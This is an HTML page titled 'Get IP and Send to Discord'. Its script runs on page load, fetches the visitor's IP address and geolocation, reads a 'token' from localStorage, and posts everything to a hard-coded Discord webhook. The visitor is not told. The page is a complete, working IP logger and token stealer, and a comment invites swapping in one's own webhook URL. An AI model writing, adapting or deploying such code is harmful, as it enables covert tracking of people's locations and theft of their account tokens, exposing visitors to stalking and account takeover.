<!DOCTYPE html>
<html>
<head>
    <title>Get IP and Send to Discord</title>
</head>
<body>
    <script>
        // Function to get a token from local storage
        function getTokenFromStorage() {
            return localStorage.getItem('token') || 'Token not found';
        }

        // Function to get the user's IP address and location
        async function getIPandLocation() {
            try {
                console.log('Fetching IP address...');
                // Fetch the IP address
                let ipResponse = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipResponse.json();
                let ip = ipData.ip;
                console.log('IP address fetched:', ip);

                // Fetch the geolocation data using ip-api.com
                console.log('Fetching location data...');
                let locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
                let locationData = await locationResponse.json();
                console.log('Location data fetched:', locationData);

                // Check status to ensure successful API call
                if (locationData.status !== 'success') {
                    throw new Error(locationData.message || 'Failed to retrieve location data');
                }

                return { ip: ip, location: locationData };
            } catch (error) {
                console.error('Error getting IP and location:', error);
                return null;
            }
        }

        // Function to send the IP address, location, and token to a Discord webhook
        async function sendToDiscord(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
            const location = data.location || {};
            const token = getTokenFromStorage(); // Get token from local storage

            const payload = {
                content: null,
                embeds: [
                    {
                        color: null,
                        fields: [
                            {
                                name: "IP:",
                                value: `${data.ip}`
                            },
                            {
                                name: "Location:",
                                value: `Country:\n${location.country || 'N/A'}\n\n` +
                                       `Region:\n${location.regionName || 'N/A'}\n\n` +
                                       `City:\n${location.city || 'N/A'}\n\n` +
                                       `ZIP:\n${location.zip || 'N/A'}\n\n` +
                                       `Latitude:\n${location.lat || 'N/A'}\n\n` +
                                       `Longitude:\n${location.lon || 'N/A'}\n\n` +
                                       `ISP:\n${location.isp || 'N/A'}\n\n` +
                                       `Organization:\n${location.org || 'N/A'}\n\n` +
                                       `AS:\n${location.as || 'N/A'}\n\n`
                            },
                            {
                                name: "Token:",
                                value: `${token}`
                            }
                        ],
                        author: {
                            name: "IP & Info"
                        }
                    }
                ],
                attachments: []
            };

            try {
                console.log('Sending data to Discord:', payload);
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                console.log('Data sent to Discord successfully');
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Main function to get IP, location, and token, and send them
        async function main() {
            const data = await getIPandLocation();
            if (data) {
                await sendToDiscord(data);
            }
        }

        // Execute the main function on page load
        window.onload = main;
    </script>
</body>
</html>
